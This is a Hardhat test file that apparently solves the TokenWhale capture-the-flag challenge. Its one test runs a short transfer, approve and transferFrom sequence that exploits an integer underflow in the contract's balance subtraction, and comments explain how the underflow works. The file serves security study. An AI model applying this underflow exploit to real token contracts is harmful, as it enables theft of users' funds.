import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let attacker2: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer, attacker2] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    //underflow attack as in transferFrom it will call _transfer(address, 500)
    //in transfer balanceOf[msg.sender] -= value (which will underflow it's balance)
    await target.transfer(attacker2.address, 510);

    await target.connect(attacker2).approve(attacker.address, 1000);

    await target.transferFrom(attacker2.address, attacker2.address, 500);


    expect(await target.isComplete()).to.equal(true);
  });
});
